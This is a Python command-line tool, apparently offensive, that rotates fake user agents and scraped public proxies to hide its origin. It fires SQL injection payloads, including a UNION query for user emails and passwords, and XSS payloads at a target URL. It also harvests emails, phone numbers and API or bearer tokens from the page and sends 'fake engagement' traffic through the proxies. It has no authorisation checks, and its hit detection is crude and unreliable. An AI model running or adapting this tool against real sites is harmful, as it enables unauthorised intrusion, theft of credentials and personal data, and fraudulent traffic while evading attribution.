import requests
import random
import re
import time
import json
from datetime import datetime
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

# Generate rotating headers
def random_headers():
    return {
        'User-Agent': UserAgent().random,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Referer': 'https://www.instagram.com/'
    }

# Fetch fresh proxies from multiple sources
def fetch_proxies():
    print("[+] Fetching proxies...")
    urls = [
        "https://www.proxy-list.download/api/v1/get?type=https",
        "https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=10000"
    ]
    proxies = []
    for url in urls:
        try:
            res = requests.get(url)
            proxies += [f"http://{p.strip()}" for p in res.text.strip().split('\n') if p.strip()]
        except requests.RequestException:
            continue
    print(f"[+] {len(proxies)} proxies fetched.")
    return proxies

# Choose a random proxy from list
def random_proxy(proxies):
    p = random.choice(proxies)
    return {"http": p, "https": p}

# Payloads
SQLI_PAYLOADS = [
    "' OR 1=1 --", "' UNION SELECT null, email, password FROM users --",
    "' OR EXISTS(SELECT * FROM users WHERE email LIKE '%@%') --"
]
XSS_PAYLOADS = [
    "<script>alert(1)</script>", "\"><svg/onload=alert(1)>"
]
FULL_PAYLOADS = SQLI_PAYLOADS + XSS_PAYLOADS

# Discover query parameters in page source
def discover_query_params(html):
    return re.findall(r'[\?&]([a-zA-Z0-9_]+)=', html)

# Inject payloads and test for hits
def inject_payloads(url, proxies):
    hits = []
    for payload in FULL_PAYLOADS:
        try:
            full_url = f"{url}?vuln={payload}"
            res = requests.get(full_url, headers=random_headers(), proxies=random_proxy(proxies), timeout=10)
            if any(x in res.text.lower() for x in ["syntax", "error", "alert", "token"]):
                print(f"[+] HIT: {full_url}")
                hits.append({"url": full_url, "payload": payload, "code": res.status_code})
        except:
            continue
    return hits

# Extract sensitive data patterns
def extract_data_from_page(content):
    emails = re.findall(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+", content)
    phones = re.findall(r"\+?\d[\d\s.-]{7,}\d", content)
    tokens = re.findall(r"(?:api|access|auth|bearer)[\"':\s]+[A-Za-z0-9_\-\.]{10,}", content, re.I)
    return emails, phones, tokens

# Simulate fake engagement
def simulate_fake_hits(url, proxies, count=10):
    print(f"[+] Simulating {count} fake hits...")
    for _ in range(count):
        try:
            r = requests.get(url, headers=random_headers(), proxies=random_proxy(proxies), timeout=10)
            print(f"    Fake hit: {r.status_code}")
            time.sleep(random.uniform(0.5, 1.5))
        except:
            continue

# Main CLI-based recon
def run_recon(target_url):
    proxies = fetch_proxies()
    if not proxies:
        print("[!] No proxies available. Exiting.")
        return

    print("[+] Scraping target page...")
    try:
        res = requests.get(target_url, headers=random_headers(), proxies=random_proxy(proxies), timeout=10)
        res.raise_for_status()
    except Exception as e:
        print(f"[!] Failed to fetch target: {e}")
        return

    print(f"[+] Status: {res.status_code}")
    page = res.text
    params = discover_query_params(page)

    print(f"[+] Discovered {len(params)} input fields/params.")
    hits = inject_payloads(target_url, proxies)

    emails, phones, tokens = extract_data_from_page(page)
    simulate_fake_hits(target_url, proxies, count=20)

    dump = {
        "target": target_url,
        "params": params,
        "payload_hits": hits,
        "emails": emails,
        "phones": phones,
        "tokens": tokens,
        "timestamp": datetime.now().isoformat()
    }

    with open("recon_report.json", "w") as f:
        json.dump(dump, f, indent=4)

    print("[+] Recon complete. Report saved to recon_report.json")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Recon CLI - XSS/SQLi Scanner & Info Extractor")
    parser.add_argument("url", help="Target URL to scan")
    args = parser.parse_args()
    run_recon(args.url)
    